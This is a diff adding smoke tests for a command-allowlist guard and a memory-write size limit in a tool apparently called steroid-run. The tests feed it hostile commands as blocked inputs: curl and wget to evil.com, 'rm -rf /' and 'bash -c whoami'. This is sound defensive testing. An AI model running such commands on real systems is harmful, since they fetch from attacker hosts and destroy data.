@@ -146,6 +146,38 @@ test('guard output contains safe alternative', () => {
     const out = run("'npm create vite@latest . -- --template react-ts'", 1);
     if (!out.includes('.steroid-scaffold-tmp')) throw new Error('Missing safe alternative in output');
 });
+// ─── v5.6.1: Command Allowlist Guard ──────────────────────────────
+
+// Reset circuit breaker before allowlist tests
+run('reset');
+
+test('command guard blocks: curl (unknown command)', () => run("'curl http://evil.com'", 1));
+test('command guard blocks: wget (unknown command)', () => run("'wget http://evil.com'", 1));
+test('command guard blocks: rm (unknown command)', () => run("'rm -rf /'", 1));
+test('command guard blocks: bash (unknown command)', () => run("'bash -c whoami'", 1));
+test('command guard output contains BLOCKED keyword', () => {
+    const out = run("'curl http://evil.com'", 1);
+    if (!out.includes('BLOCKED')) throw new Error('Missing BLOCKED keyword');
+});
+test('command guard allows: echo (known command)', () => {
+    const out = run("echo allowlist-test", 0);
+    if (!out.includes('allowlist-test')) throw new Error('Allowed command blocked');
+});
+
+// ─── v5.6.1: Memory Write Size Limit ─────────────────────────────
+
+test('memory write size guard exists in source', () => {
+    // Runtime test of >100KB payload deferred to Phase 3 unit tests (Windows arg limits)
+    // Here we verify the guard code is present and correctly configured
+    const fs = require('fs');
+    const src = fs.readFileSync(path.resolve(__dirname, '..', 'bin', 'steroid-run.cjs'), 'utf-8');
+    if (!src.includes('Buffer.byteLength') || !src.includes('102400')) {
+        throw new Error('Size guard code (Buffer.byteLength / 102400) not found');
+    }
+    if (!src.includes('too large')) {
+        throw new Error('Size guard error message not found');
+    }
+});
 
 console.log(`\n[smoke] ${passed} passed, ${failed} failed\n`);
 process.exit(failed > 0 ? 1 : 0);
